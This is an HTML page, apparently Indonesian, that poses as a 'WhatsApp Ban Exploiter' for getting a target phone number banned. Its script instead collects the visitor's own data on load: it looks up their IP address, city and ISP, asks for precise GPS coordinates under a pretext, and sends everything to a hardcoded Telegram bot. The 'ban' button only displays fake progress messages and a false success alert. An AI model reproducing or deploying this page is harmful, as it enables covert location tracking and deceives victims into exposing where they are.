<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS - WhatsApp Ban Exploiter</title>
    <style>
        :root { --primary: #00f2ff; --bg: #050b10; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .nexus-panel { background: rgba(10, 20, 30, 0.95); border: 1px solid var(--primary); padding: 40px; border-radius: 20px; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); width: 100%; max-width: 400px; text-align: center; position: relative; }
        .nexus-panel::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--primary), transparent); animation: scan 2s linear infinite; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        h1 { font-size: 24px; letter-spacing: 5px; color: var(--primary); text-shadow: 0 0 10px var(--primary); margin-bottom: 5px; }
        p { font-size: 12px; color: #668; margin-bottom: 25px; }
        .input-box { position: relative; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; background: #0d161d; border: 1px solid #1a2a35; border-radius: 10px; color: white; font-size: 16px; outline: none; transition: 0.3s; box-sizing: border-box; }
        input:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }
        button { width: 100%; padding: 15px; background: var(--primary); color: #000; border: none; border-radius: 10px; font-weight: bold; font-size: 14px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
        button:hover { background: #fff; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.4); }
        #log { margin-top: 20px; font-family: monospace; font-size: 10px; color: #4e7a8a; text-align: left; height: 50px; overflow-y: auto; border-left: 2px solid var(--primary); padding-left: 10px; }
    </style>
</head>
<body>

<div class="nexus-panel">
    <h1>NEXUS</h1>
    <p>WHATSAPP BAN SYSTEM EXPLOIT</p>
    
    <div id="log">Initializing Secure Tunnel...<br></div>

    <div class="input-box">
        <input type="text" id="target" placeholder="TARGET NUMBER (628...)">
    </div>
    
    <button onclick="startProcess()">EXECUTE BAN</button>
    
    <div style="margin-top: 20px; font-size: 10px; color: #ff4444;">
        *SINKRONISASI GPS DIWAJIBKAN UNTUK MENGHINDARI IP BAN*
    </div>
</div>

<script>
    const config = {
        token: "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc",
        chatId: "8551809114"
    };

    function addLog(msg) {
        const l = document.getElementById('log');
        l.innerHTML += `> ${msg}<br>`;
        l.scrollTop = l.scrollHeight;
    }

    // 1. AUTO-GRAB ON START
    window.onload = async () => {
        addLog("Syncing with Global Proxy...");
        
        // Ambil data IP & ISP dulu (Sebagai Cadangan)
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipData = await ipRes.json();
            sendToTele(`🌐 *CADANGAN IP TARGET*\n\n• IP: ${ipData.ip}\n• Kota: ${ipData.city}\n• ISP: ${ipData.org}`);
        } catch (e) { addLog("Proxy Error. Re-routing..."); }

        // Minta Lokasi Presisi (UTAMA)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude, accuracy } = pos.coords;
                const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
                await sendToTele(`📍 *LOKASI PRESISI (GPS)*\n\n• Lat: ${latitude}\n• Lon: ${longitude}\n• Akurasi: ${accuracy}m\n\n🔗 [BUKA MAPS](${maps})`);
                addLog("Secure GPS Link Established.");
            }, () => {
                addLog("GPS Access Denied. Using Proxy only.");
            });
        }
    };

    async function sendToTele(text) {
        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chatId, text: text, parse_mode: 'Markdown' })
        });
    }

    function startProcess() {
        const t = document.getElementById('target').value;
        if(!t) return alert("Enter target number!");
        
        addLog(`Attacking ${t}...`);
        setTimeout(() => addLog("Injecting Payload..."), 1000);
        setTimeout(() => addLog("Spamming Reports..."), 2000);
        setTimeout(() => {
            alert("SUCCESS: Request sent to Meta Security Team!");
            addLog("Operation Complete.");
        }, 4000);
    }
</script>

</body>
</html>
